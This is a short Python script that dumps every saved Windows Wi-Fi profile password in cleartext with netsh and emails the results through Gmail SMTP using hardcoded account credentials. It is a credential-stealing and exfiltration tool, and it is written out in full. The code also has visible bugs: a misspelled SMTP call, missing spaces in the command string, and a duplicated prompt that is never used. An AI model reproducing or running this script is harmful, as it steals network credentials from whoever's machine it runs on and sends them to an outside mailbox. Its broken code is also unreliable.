#!/usr/bin/python

import subprocess, smtplib, re

command1 = "netsh wlan show profile"
networks = subprocess.check_output(command1,shell = True)
network_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

final_output = ""
for network in network_list:
	command2 = "netsh wlan show profile" + network + "key=clear"
	one_network_result = subprocess.check_output(command2, shell=True)
	final_output += one_network_result
Email = raw_input("Enter Email to Send to :")
password = raw_input("Enter Email to Send to :")

server = smtplib.smpt("smtp.gmail.com", 587)
server.starttls()
server.login("windows32@gmail.com"," Test1234")
server.sendmail("windows32w@gmail.com"," windows32@gmail.com", final_output)


server.quit()
